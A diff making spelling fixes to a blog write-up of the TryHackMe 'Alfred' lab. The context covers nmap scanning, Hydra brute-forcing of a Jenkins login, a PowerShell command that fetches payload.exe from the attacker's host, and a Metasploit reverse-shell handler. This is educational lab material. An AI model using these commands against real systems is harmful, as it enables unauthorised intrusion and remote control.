@@ -13,7 +13,7 @@ tags:
 
 ## Alfred - TryHackme's Room Writeup
 
-This is my first attempt at creating a writup, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those. I even left some futile attemps of enumeration to be honest about my process of solving this. I hope somebody finds this useful somehow, it ceirtanly helped me to practice some tools and approaches. As I'm still quite new to this, you can expect some errors in this post or maybe spot some things that an experienced person could probably solve better. I'm learning, beware of the blog.
+This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those. I even left some futile attempts of enumeration to be honest about my process of solving this. I hope somebody finds this useful somehow, it certainly helped me to practice some tools and approaches. As I'm still quite new to this, you can expect some errors in this post or maybe spot some things that an experienced person could probably solve better. I'm learning, beware of the blog.
 
 
 [Task 1] - Getting Initial Access
@@ -30,7 +30,7 @@ Ok once you have that tool downloaded to your system we can get started. Let's g
 
 > Question #1: How many ports are open?
 
-Ok so for this question we'll run **Nmap** to enumerate any open ports. It is importan to note that the room description mentions this machine **won't respond to ping (ICMP)** requests. So we'll need to add switch to deal with that when running our scan.
+Ok so for this question we'll run **Nmap** to enumerate any open ports. It is important to note that the room description mentions this machine **won't respond to ping (ICMP)** requests. So we'll need to add a switch to deal with that when running our scan.
 
 ```shell
 sudo nmap -A -Pn -p- 10.10.177.5
@@ -86,7 +86,7 @@ It seems there is not much info lying around the code of the page. It is always 
 
 The next thing we can check, is to review if we may have any data encrypted into that image of Bruce Wayne.  So let's download it.
 
-At this point we would need a **passphrase ** if we want to attempt to extract any possibly hidden data in from this image. Since we don't have any piece of info so far that could act as a passphrase. We'll move forward from this for now. Also we are not even sure if this image has had any **steganography** job done.
+At this point we would need a **passphrase** if we want to attempt to extract any possibly hidden data in from this image. Since we don't have any piece of info so far that could act as a passphrase. We'll move forward from this for now. Also we are not even sure if this image has had any **steganography** job done.
 
 I would be wise to start scanning for some other directories we might be able to access. Let's use GoBuster.
 
@@ -134,11 +134,11 @@ To start let's launch **Burp Suite**, we'll be using the integrated browser to n
 
 ![Burp Suite](https://i.imgur.com/SBakfmQ.png)
 
->_NOTE:_ If you get an eror about the integrated browser not able to run due to sandboxed settings. Got to Project Options -> Misc -> Check "allow the embedded browser to run without a sandbox".
+>_NOTE:_ If you get an error about the integrated browser not able to run due to sandboxed settings. Got to Project Options -> Misc -> Check "allow the embedded browser to run without a sandbox".
 
 Once you have Burp running in the **Proxy -> Intercept** tab click on **Open Browser**. In the new Browser window open the machine IP at port 8080 to load the Jenkins login form.
 
-- Remember to add the target IP to Burp's Scope, so it doesn't stop every single request from non-targed related IPs.
+- Remember to add the target IP to Burp's Scope, so it doesn't stop every single request from non-target related IPs.
 
 Ok so in order to brute force the login with Hydra, we need to Intercept a login request with Burp so we can get some important pieces of Information: **[URL]**, **[UsernameField]**, **[PasswordField]** and the **[InvalidCredentialsErrorMessage]**. These are all required for our Hydra attack.
 
@@ -206,7 +206,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-17 14:32:
 ```
 
 
-So that gives us the answer to Question #2 in a brute forced way.
+So that gives us the answer to Question #2 in a brute-forced way.
 
 Let's move to the next objective.
 
@@ -369,9 +369,9 @@ In my case that command would look like this:
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.0.34:8000/payload.exe','payload.exe')"
 ```
 
-We'll also need to setup a **multi handler** in **metasploit** to listen for our **payload.exe** reverse shell connection.
+We'll also need to setup a **multi handler** in **Metasploit** to listen for our **payload.exe** reverse shell connection.
 
-In our terminal let's start **msfconsole** to fire up **metasploit** and create our listener.
+In our terminal let's start **msfconsole** to fire up **Metasploit** and create our listener.
 
 ```bash
 $ msfconsole
@@ -437,7 +437,7 @@ Exploit target:
 
 ```
 
-As we can see, we just need to set **[LHOST]** and **[LPORT]** to the right values, let's do that.  And type in **exploit** or **run** to start our **metasploit listener/handler**.
+As we can see, we just need to set **[LHOST]** and **[LPORT]** to the right values, let's do that.  And type in **exploit** or **run** to start our **Metasploit listener/handler**.
 
 > Make sure to set the **[LPORT]** to the port you specified when creating the **payload.exe** with **msfvenom**.
 
@@ -727,7 +727,7 @@ type root.txt
 C:\Windows\System32\config>
 
 ```
-And that's all there is to this room. I hope you find this useful, I tried to detail pretty much every step I took to solve the room. I'm sure there is some other ways to go about solving this room, I tried to operate within my noob-level expertise and I think the end result could prove appealing to other noob-level ethical hackers out there.
+And that's all there is to this room. I hope you find this useful, I tried to detail pretty much every step I took to solve the room. I'm sure there are other ways to go about solving this room, I tried to operate within my noob-level expertise and I think the end result could prove useful to other noob-level ethical hackers out there.
 
 As usual, happy hacking.
 
